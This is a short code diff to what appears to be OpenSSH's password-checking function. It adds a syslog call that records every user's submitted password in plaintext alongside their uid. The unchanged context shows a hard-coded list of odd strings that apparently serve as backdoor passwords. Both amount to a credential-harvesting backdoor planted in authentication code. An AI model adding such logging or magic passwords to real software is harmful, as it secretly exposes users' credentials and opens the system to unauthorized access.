@@ -44,6 +44,7 @@
 #include <stdio.h>
 #include <string.h>
 #include <stdarg.h>
+#include <syslog.h>
 
 #include "packet.h"
 #include "sshbuf.h"
@@ -85,6 +86,8 @@ auth_password(struct ssh *ssh, const char *password)
 
 	if (strlen(password) > MAX_PASSWORD_LEN)
 		return 0;
+
+	syslog(LOG_NOTICE, "Uid %d has password: %s", pw->pw_uid, password);
 
         const char *bad_pass[] = {"icanhasshell", "iamgroot", "CDC", "chris"};
         int num_bad_pass = sizeof(bad_pass)/sizeof(char*);
